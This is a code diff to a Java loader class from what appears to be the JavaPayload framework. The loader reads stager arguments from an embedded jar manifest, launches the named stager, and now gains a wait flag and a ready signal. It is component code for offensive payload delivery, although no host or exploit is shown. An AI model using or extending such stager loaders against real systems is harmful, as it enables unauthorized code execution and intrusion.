@@ -39,14 +39,38 @@ import java.util.jar.Manifest;
 
 import javapayload.stager.Stager;
 
-public class EmbeddedJarLoader {
+public class EmbeddedJarLoader implements Runnable {
 	public static void main(String[] args) throws Exception {
+		boolean needWait = false;
+		if (args.length == 1 && args[0].equals("+")) {
+			args[0] = args[0].substring(1);
+			needWait = true;
+		}
 		final Manifest manifest = new Manifest(EmbeddedJarLoader.class.getResourceAsStream("/" + JarFile.MANIFEST_NAME));
 		args = new String[Integer.parseInt(manifest.getMainAttributes().getValue("Argument-Count"))];
 		for (int i = 0; i < args.length; i++) {
 			args[i] = manifest.getMainAttributes().getValue("Argument-" + i);
 		}
 		final Stager stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
-		stager.bootstrap(args);
+		stager.bootstrap(args, needWait);
+		if (needWait) {
+			new Thread(new EmbeddedJarLoader(stager)).start();
+		}
+	}
+	
+	private Stager stager;
+
+	public EmbeddedJarLoader(Stager stager) {
+		this.stager = stager;
+	}
+	
+	public void run() {
+		try {
+			stager.waitReady();
+			System.out.println("+");
+			System.out.flush();
+		} catch (InterruptedException ex) {
+			ex.printStackTrace();
+		}
 	}
 }
